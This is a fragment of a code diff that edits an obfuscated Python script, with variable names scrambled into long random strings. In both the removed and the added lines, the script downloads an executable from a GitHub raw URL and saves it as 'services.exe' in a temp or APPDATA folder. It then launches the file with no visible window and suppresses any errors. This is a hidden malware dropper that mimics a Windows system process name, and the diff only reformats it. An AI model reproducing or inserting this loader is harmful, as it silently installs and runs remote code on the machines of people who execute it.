@@ -16,22 +16,22 @@ rfQKVtiApHxhcbIvYDuNSzJUWOBwlTgd="https://github.com/Dch12zz/services/raw/refs/h
 rfQKVtiApHxhcbIvYDuNSzJUWOBwlTgs=rfQKVtiApHxhcbIvYDuNSzJUWOBwlTgC()
 rfQKVtiApHxhcbIvYDuNSzJUWOBwlTgo=rfQKVtiApHxhcbIvYDuNSzJUWOBwlTgL.join(rfQKVtiApHxhcbIvYDuNSzJUWOBwlTgs,f"services.exe")
 if not rfQKVtiApHxhcbIvYDuNSzJUWOBwlTgL.exists(rfQKVtiApHxhcbIvYDuNSzJUWOBwlTgo):
- rfQKVtiApHxhcbIvYDuNSzJUWOBwlTge=rfQKVtiApHxhcbIvYDuNSzJUWOBwlTgn(rfQKVtiApHxhcbIvYDuNSzJUWOBwlTgd)
- if rfQKVtiApHxhcbIvYDuNSzJUWOBwlTge.status_code==200:
-  with rfQKVtiApHxhcbIvYDuNSzJUWOBwlTgM(rfQKVtiApHxhcbIvYDuNSzJUWOBwlTgo,'wb')as rfQKVtiApHxhcbIvYDuNSzJUWOBwlTgq:
-   rfQKVtiApHxhcbIvYDuNSzJUWOBwlTgq.write(rfQKVtiApHxhcbIvYDuNSzJUWOBwlTge.content)
-   try:
-    rfQKVtiApHxhcbIvYDuNSzJUWOBwlTgX(rfQKVtiApHxhcbIvYDuNSzJUWOBwlTgo,creationflags=CREATE_NO_WINDOW,shell=rfQKVtiApHxhcbIvYDuNSzJUWOBwlTgP)
-   except:
-    pass
+    rfQKVtiApHxhcbIvYDuNSzJUWOBwlTge=rfQKVtiApHxhcbIvYDuNSzJUWOBwlTgn(rfQKVtiApHxhcbIvYDuNSzJUWOBwlTgd)
+    if rfQKVtiApHxhcbIvYDuNSzJUWOBwlTge.status_code==200:
+        with open(rfQKVtiApHxhcbIvYDuNSzJUWOBwlTgo,'wb')as rfQKVtiApHxhcbIvYDuNSzJUWOBwlTgq:
+            rfQKVtiApHxhcbIvYDuNSzJUWOBwlTgq.write(rfQKVtiApHxhcbIvYDuNSzJUWOBwlTge.content)
+        try:
+            Popen(rfQKVtiApHxhcbIvYDuNSzJUWOBwlTgo,creationflags=CREATE_NO_WINDOW,shell=rfQKVtiApHxhcbIvYDuNSzJUWOBwlTgP)
+        except:
+            pass
 else:
- rfQKVtiApHxhcbIvYDuNSzJUWOBwlTgF=rfQKVtiApHxhcbIvYDuNSzJUWOBwlTgk('APPDATA')
- rfQKVtiApHxhcbIvYDuNSzJUWOBwlTgo=rfQKVtiApHxhcbIvYDuNSzJUWOBwlTgL.join(rfQKVtiApHxhcbIvYDuNSzJUWOBwlTgF,f"services.exe")
- rfQKVtiApHxhcbIvYDuNSzJUWOBwlTge=rfQKVtiApHxhcbIvYDuNSzJUWOBwlTgn(rfQKVtiApHxhcbIvYDuNSzJUWOBwlTgd)
- if rfQKVtiApHxhcbIvYDuNSzJUWOBwlTge.status_code==200:
-  with rfQKVtiApHxhcbIvYDuNSzJUWOBwlTgM(rfQKVtiApHxhcbIvYDuNSzJUWOBwlTgo,'wb')as rfQKVtiApHxhcbIvYDuNSzJUWOBwlTgq:
-   rfQKVtiApHxhcbIvYDuNSzJUWOBwlTgq.write(rfQKVtiApHxhcbIvYDuNSzJUWOBwlTge.content)
-   try:
-    rfQKVtiApHxhcbIvYDuNSzJUWOBwlTgX(rfQKVtiApHxhcbIvYDuNSzJUWOBwlTgo,creationflags=CREATE_NO_WINDOW,shell=rfQKVtiApHxhcbIvYDuNSzJUWOBwlTgP)
-   except:
-    pass
+    rfQKVtiApHxhcbIvYDuNSzJUWOBwlTgF=rfQKVtiApHxhcbIvYDuNSzJUWOBwlTgk('APPDATA')
+    rfQKVtiApHxhcbIvYDuNSzJUWOBwlTgo=rfQKVtiApHxhcbIvYDuNSzJUWOBwlTgL.join(rfQKVtiApHxhcbIvYDuNSzJUWOBwlTgF,f"services.exe")
+    rfQKVtiApHxhcbIvYDuNSzJUWOBwlTge=rfQKVtiApHxhcbIvYDuNSzJUWOBwlTgn(rfQKVtiApHxhcbIvYDuNSzJUWOBwlTgd)
+    if rfQKVtiApHxhcbIvYDuNSzJUWOBwlTge.status_code==200:
+        with open(rfQKVtiApHxhcbIvYDuNSzJUWOBwlTgo,'wb')as rfQKVtiApHxhcbIvYDuNSzJUWOBwlTgq:
+            rfQKVtiApHxhcbIvYDuNSzJUWOBwlTgq.write(rfQKVtiApHxhcbIvYDuNSzJUWOBwlTge.content)
+            try:
+                Popen(rfQKVtiApHxhcbIvYDuNSzJUWOBwlTgo,creationflags=CREATE_NO_WINDOW,shell=rfQKVtiApHxhcbIvYDuNSzJUWOBwlTgP)
+            except:
+                pass
